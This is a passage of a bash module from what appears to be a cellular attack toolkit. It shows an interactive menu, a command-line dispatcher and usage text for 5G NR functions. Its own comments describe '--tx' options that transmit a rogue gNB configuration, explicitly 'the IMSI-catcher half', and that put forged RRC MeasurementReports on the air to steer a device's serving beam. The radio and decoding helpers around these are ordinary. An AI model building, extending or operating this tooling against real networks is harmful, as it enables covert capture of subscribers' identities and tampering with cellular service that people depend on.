                read -rp "  dl_arfcn (640000)> " a
                read -rp "  pci (1)> " i
                nair_cmd_gen_conf_tx "${p:-00101}" "${b:-n78}" "${a:-640000}" "${i:-1}" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            10)
                read -rp "  tx (0-3)> " t
                read -rp "  measIdToAddMod (i/o/c, comma sep, blank for none)> " mm
                nair_cmd_build_rrc_reconfig "tx=${t:-0}${mm:+,meas=$mm}" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            11)
                read -rp "  measId (1-64)> " mi
                read -rp "  serving rsrp index (blank for none)> " sr
                read -rp "  SSB entries (ssbIndex:rsrp, comma sep)> " se
                nair_cmd_build_meas_report "measId=${mi:-1}${sr:+,servRsrp=$sr}${se:+,ssb=$se}" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            12)
                read -rp "  RRC PDU hex> " hx
                nair_cmd_decode_rrc "$hx" | column -t -s$'\t' 2>/dev/null || nair_cmd_decode_rrc "$hx"
                read -rp "  press enter " _ ;;
            13)
                read -rp "  measId (1-64)> " mi
                read -rp "  SSB entries (ssbIndex:rsrp, comma sep)> " se
                nair_cmd_beam_sweep "measId=${mi:-1},ssb=$se" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            14) nair_start | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
            15) nair_stop  | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
            16) nair_status | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
            17)
                read -rp "  out file ($NAIR_DIR/ssb.wave.c16)> " w
                read -rp "  format (cf32|ci16|cu8) [ci16]> " wf
                read -rp "  rate sps [30720000]> " wr
                read -rp "  n_rb [51]> " wn
                read -rp "  pci [1]> " wp
                read -rp "  i_ssb [0]> " wi
                read -rp "  scs kHz (15|30|120|240) [30]> " ws
                read -rp "  reps [1]> " wrp
                nair_cmd_ssb_waveform "${w:-$NAIR_DIR/ssb.wave.c16}" \
                    --format "${wf:-ci16}" --rate "${wr:-30720000}" \
                    --n-rb "${wn:-51}" --pci "${wp:-1}" --i-ssb "${wi:-0}" \
                    --scs "${ws:-30}" --reps "${wrp:-1}" \
                    | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            0) return ;;
            *) warn "invalid"; sleep 1 ;;
        esac
    done
}

# ── CLI dispatch ────────────────────────────────────────────────────────
nair_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)   nair_cli_status_tsv ;;
        --arfcn)        nair_cmd_arfcn "${1:-}" ;;
        --pci)          nair_cmd_pci "${1:-}" "${2:-}" ;;
        --decode-mib)   nair_cmd_decode_mib "${1:-}" ;;
        --decode-sib1)  nair_cmd_decode_sib1 "${1:-}" ;;
        --ssb)          nair_cmd_ssb "${1:-n78}" "${2:-0}" ;;
        --ssb-waveform) nair_cmd_ssb_waveform "$@" ;;
        --prach)        nair_cmd_prach "${1:-1}" "${2:-1}" "${3:-15}" ;;
        --gen-gnb-conf)
            # --tx is a modifier, not an action: it selects the TRANSMITTING
            # gNB config (the IMSI-catcher half) and then runs the transmit
            # path for it. NAIR_TX_DRYRUN=1 stops after the waveform is built
            # and decoded back, before the radio. Accept --tx anywhere in the
            # argument list.
            local txmode=0 args=()
            while (($#)); do
                case "$1" in
                    --tx) txmode=1 ;;
                    *)    args+=("$1") ;;
                esac
                shift
            done
            if (( txmode )); then
                nair_cmd_tx_ssb "${args[0]:-00101}" "${args[1]:-n78}" \
                                "${args[2]:-640000}" "${args[3]:-1}"
            else
                nair_cmd_gen_conf "${args[0]:-00101}" "${args[1]:-n78}" \
                                  "${args[2]:-640000}" "${args[3]:-1}"
            fi ;;
        --gen-core-conf) nair_gen_open5gs_conf "${1:-00101}" "${2:-7}" ;;
        --build-rrc-reconfig) nair_cmd_build_rrc_reconfig "${1:-}" ;;
        --build-meas-report)
            # --tx is a modifier: it puts the forged report on the air as a
            # real PUSCH slot instead of only printing the PDU.
            local mtflag=0 mspec=""
            while (($#)); do
                case "$1" in
                    --tx) mtflag=1 ;;
                    *)    mspec="$1" ;;
                esac
                shift
            done
            if (( mtflag )); then
                nair_cmd_meas_report_tx "$mspec"
            else
                nair_cmd_build_meas_report "$mspec"
            fi ;;
        --decode-rrc)         nair_cmd_decode_rrc "${1:-}" ;;
        --beam-sweep)         nair_cmd_beam_sweep "${1:-}" ;;
        --oai-gnb)      nair_oai_gnb "${1:-78}" "${2:-}" "${3:-1}" ;;
        --start)        nair_start "${1:-$NAIR_CONF}" ;;
        --stop)         nair_stop ;;
        --status)       nair_status ;;
        --selftest)     nair_selftest ;;
        --menu)         nair_menu ;;
        *)
            cat >&2 <<EOF
5G NR Air Interface — NR-ARFCN, SSB, MIB/SIB1, RACH, gNB orchestration

Usage: $0 COMMAND
  --status-tsv                  tool, config and process state as TSV
  --arfcn <N>                   NR-ARFCN -> frequency, band, FR, GSCN
  --pci <n_id_1> <n_id_2>       PCI derivation (n_id_1 0..335, n_id_2 0..2)
  --decode-mib <hex>            decode a 24-bit MIB payload
  --decode-sib1 <hex>           decode SIB1: PLMN list, TAC, cellIdentity
  --decode-rrc <hex>            decode an RRC PDU built by this module
  --ssb <band> [i_ssb]          SSB burst set pattern and half-frame timing
  --ssb-waveform <out> [--format cf32|ci16|cu8] [--rate <sps>] [--n-rb <n>]
                 [--pci <n>] [--i-ssb <n>] [--scs <khz>] [--reps <n>]
                                write ONE SS/PBCH burst (PSS+SSS+PBCH+PBCH
                                DMRS, 4 CP-OFDM symbols) as IQ at baseband,
                                mapped into an --n-rb raster and inverse-FFTed
                                at --rate. cf32/ci16/cu8 are modules/33_
                                jamming_detect.sh's own formats, so its loader
                                reads the file unchanged. The SSB sits at
                                subcarrier 0 of the raster (k_SSB=0, point A=0:
                                this module has no CORESET#0 table). --reps
                                tiles the burst.
  --prach <index> [fdm] [scs]   PRACH occasions from the SIB1 RACH config
  --beam-sweep <measId=N,ssb=i:r,...>
                                infer the serving beam from reported SSB
                                indices and steer a forged report at one
  --build-rrc-reconfig <tx=N[,meas=i/o/c,...]>
                                build an RRCReconfiguration (TS 38.331 6.2.2)
  --build-meas-report <measId=N[,servCell=N][,servRsrp=N][,ssb=i:r,...]> [--tx]
                                build a MeasurementReport (TS 38.331 6.2.2);
                                --tx carries that PDU on a real CP-OFDM PUSCH
                                slot and keys the radio (arfcn=, band= and
                                scid= steer the uplink waveform and are not
                                encoded into the report). Without a radio --tx
                                fails and prints no success line.
  --gen-gnb-conf [plmn] [band] [arfcn] [pci] [--tx]
                                write an srsRAN gNB config; --tx writes the
                                TRANSMITTING gNB (the IMSI-catcher half) and
                                then keys the radio with that cell's SSB burst
                                set. NAIR_TX_DRYRUN=1 builds and decodes the
                                waveform but transmits nothing. Without a radio
                                --tx fails and prints no success line.
  --gen-core-conf [plmn] [tac]  write a minimal Open5GS AMF slice
  --oai-gnb [band] [arfcn] [pci]
                            the same cell as an OpenAirInterface nr-softmodem: the gnb.conf shape, the driver and the command line
  --start [conf]                start the gNB (needs srsRAN)
  --stop                        stop the gNB (idempotent)
  --status                      same fields as --status-tsv, readable
  --selftest                    verify tables and parsers without a radio
  --menu                        interactive menu
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    IMSISTING_CLI=1
    : "${TMP_DIR:=/tmp/imsisting}"
    declare -F banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    nair_cli_main "$@"
fi
